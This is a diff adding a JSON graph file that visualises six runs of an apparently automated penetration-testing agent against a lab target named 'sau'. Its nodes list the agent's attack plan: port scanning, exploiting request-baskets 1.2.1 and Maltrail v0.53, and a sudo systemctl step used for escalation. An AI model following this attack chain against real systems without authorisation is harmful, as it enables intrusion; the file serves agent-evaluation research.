+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s8_1.9",
+      "label": "Track: 1.9:{Command executed: `sudo \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.9 Exploit the selected exploitation:\n1.9:{Command executed: `sudo /usr/bin/systemctl status trail.service` by user puma on server",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s8_1.9",
+      "label": "Agent: 1.9\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.9:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)\n  \u2713 1.7 Exploit the selected exploitation\n  \u2713 1.8 Explore the suspicious files, commands and create a summary of the findings\n  \u2713 1.9 Exploit the selected exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "[Run 6/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)\n  \u2713 1.7 Exploit the selected exploitation\n  \u2713 1.8 Explore the suspicious files, commands and create a summary of the findings\n  \u2713 1.9 Exploit the selected exploitation",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r1_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r1_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r1_base",
+      "to": "track:sau:r1_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r1_base",
+      "to": "agent:sau:r1_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r1_base",
+      "to": "agent:sau:r1_s1_1.3.3",
+      "label": "\u2192 1.3.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r1_base",
+      "to": "search:sau:r1_s1_1.3.3",
+      "label": "1.3.3 Enumerate further o\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r1_s1_1.3.3",
+      "to": "track:sau:r1_s1_1.3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r1_s1_1.3.3",
+      "to": "agent:sau:r1_s1_1.3.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r1_s1_1.3.3",
+      "to": "agent:sau:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r2_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r2_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r2_base",
+      "to": "track:sau:r2_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r2_base",
+      "to": "agent:sau:r2_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r2_base",
+      "to": "agent:sau:r2_s1_1.3.3",
+      "label": "\u2192 1.3.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r2_base",
+      "to": "search:sau:r2_s1_1.3.3",
+      "label": "1.3.3 Enumerate further o\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r2_s1_1.3.3",
+      "to": "track:sau:r2_s1_1.3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r2_s1_1.3.3",
+      "to": "agent:sau:r2_s1_1.3.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r2_s1_1.3.3",
+      "to": "agent:sau:r2_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r3_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r3_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r3_base",
+      "to": "track:sau:r3_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r3_base",
+      "to": "agent:sau:r3_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r3_base",
+      "to": "agent:sau:r3_s1_1.3.5",
+      "label": "\u2192 1.3.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r3_base",
+      "to": "search:sau:r3_s1_1.3.5",
+      "label": "1.3.5 Exploit the selecte\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r3_s1_1.3.5",
+      "to": "track:sau:r3_s1_1.3.5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r3_s1_1.3.5",
+      "to": "agent:sau:r3_s1_1.3.5",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r3_s1_1.3.5",
+      "to": "agent:sau:r3_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r4_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r4_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r4_base",
+      "to": "track:sau:r4_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r4_base",
+      "to": "agent:sau:r4_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r4_base",
+      "to": "agent:sau:r4_s1_1.7",
+      "label": "\u2192 1.7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r4_base",
+      "to": "search:sau:r4_s1_1.7",
+      "label": "1.7 Further exploit the\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r4_s1_1.7",
+      "to": "track:sau:r4_s1_1.7",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r4_s1_1.7",
+      "to": "agent:sau:r4_s1_1.7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r4_s1_1.7",
+      "to": "agent:sau:r4_s2_1.8",
+      "label": "\u2192 1.8",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r4_s1_1.7",
+      "to": "search:sau:r4_s2_1.8",
+      "label": "1.8 Exploit the identif\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r4_s2_1.8",
+      "to": "track:sau:r4_s2_1.8",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r4_s2_1.8",
+      "to": "agent:sau:r4_s2_1.8",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r4_s2_1.8",
+      "to": "agent:sau:r4_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r5_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r5_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r5_base",
+      "to": "track:sau:r5_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r5_base",
+      "to": "agent:sau:r5_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r5_base",
+      "to": "agent:sau:r5_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "agent:sau:r6_base",
+      "label": "baseline",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:START",
+      "to": "search:sau:r6_base",
+      "label": "Baseline Recon",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_base",
+      "to": "track:sau:r6_base",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_base",
+      "to": "agent:sau:r6_base",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_base",
+      "to": "agent:sau:r6_s1_1.3.3",
+      "label": "\u2192 1.3.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_base",
+      "to": "search:sau:r6_s1_1.3.3",
+      "label": "1.3.3 Enumerate port 80",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s1_1.3.3",
+      "to": "track:sau:r6_s1_1.3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s1_1.3.3",
+      "to": "agent:sau:r6_s1_1.3.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s1_1.3.3",
+      "to": "agent:sau:r6_s1_1.3.4",
+      "label": "\u2192 1.3.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s1_1.3.3",
+      "to": "search:sau:r6_s1_1.3.4",
+      "label": "1.3.4 Enumerate port 55555",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s1_1.3.4",
+      "to": "track:sau:r6_s1_1.3.4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s1_1.3.4",
+      "to": "agent:sau:r6_s1_1.3.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s1_1.3.4",
+      "to": "agent:sau:r6_s2_1.3.5",
+      "label": "\u2192 1.3.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s1_1.3.4",
+      "to": "search:sau:r6_s2_1.3.5",
+      "label": "1.3.5 Further Enumerate t\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s2_1.3.5",
+      "to": "track:sau:r6_s2_1.3.5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s2_1.3.5",
+      "to": "agent:sau:r6_s2_1.3.5",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s2_1.3.5",
+      "to": "agent:sau:r6_s3_1.4",
+      "label": "\u2192 1.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s2_1.3.5",
+      "to": "search:sau:r6_s3_1.4",
+      "label": "1.4 Perform vulnerabili\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s3_1.4",
+      "to": "track:sau:r6_s3_1.4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s3_1.4",
+      "to": "agent:sau:r6_s3_1.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s3_1.4",
+      "to": "agent:sau:r6_s4_1.5",
+      "label": "\u2192 1.5",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s3_1.4",
+      "to": "search:sau:r6_s4_1.5",
+      "label": "1.5 Exploit the found e\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s4_1.5",
+      "to": "track:sau:r6_s4_1.5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s4_1.5",
+      "to": "agent:sau:r6_s4_1.5",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s4_1.5",
+      "to": "agent:sau:r6_s5_1.6",
+      "label": "\u2192 1.6",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s4_1.5",
+      "to": "search:sau:r6_s5_1.6",
+      "label": "1.6 Perform vulnerabili\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s5_1.6",
+      "to": "track:sau:r6_s5_1.6",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s5_1.6",
+      "to": "agent:sau:r6_s5_1.6",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s5_1.6",
+      "to": "agent:sau:r6_s6_1.7",
+      "label": "\u2192 1.7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s5_1.6",
+      "to": "search:sau:r6_s6_1.7",
+      "label": "1.7 Exploit the selecte\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s6_1.7",
+      "to": "track:sau:r6_s6_1.7",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s6_1.7",
+      "to": "agent:sau:r6_s6_1.7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s6_1.7",
+      "to": "agent:sau:r6_s8_1.7",
+      "label": "\u2192 1.7",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s6_1.7",
+      "to": "search:sau:r6_s8_1.7",
+      "label": "1.7 Exploit the selecte\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s8_1.7",
+      "to": "track:sau:r6_s8_1.7",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s8_1.7",
+      "to": "agent:sau:r6_s8_1.7",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s8_1.7",
+      "to": "agent:sau:r6_s8_1.8",
+      "label": "\u2192 1.8",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s8_1.7",
+      "to": "search:sau:r6_s8_1.8",
+      "label": "1.8 Explore the suspici\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s8_1.8",
+      "to": "track:sau:r6_s8_1.8",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s8_1.8",
+      "to": "agent:sau:r6_s8_1.8",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s8_1.8",
+      "to": "agent:sau:r6_s8_1.9",
+      "label": "\u2192 1.9",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s8_1.8",
+      "to": "search:sau:r6_s8_1.9",
+      "label": "1.9 Exploit the selecte\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:sau:r6_s8_1.9",
+      "to": "track:sau:r6_s8_1.9",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:sau:r6_s8_1.9",
+      "to": "agent:sau:r6_s8_1.9",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:sau:r6_s8_1.9",
+      "to": "agent:sau:r6_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 70,
+    "total_edges": 90,
+    "agent_nodes": 28,
+    "search_nodes": 21,
+    "track_nodes": 21,
+    "runs_detected": 6,
+    "rows_captured": 21
+  }
+}
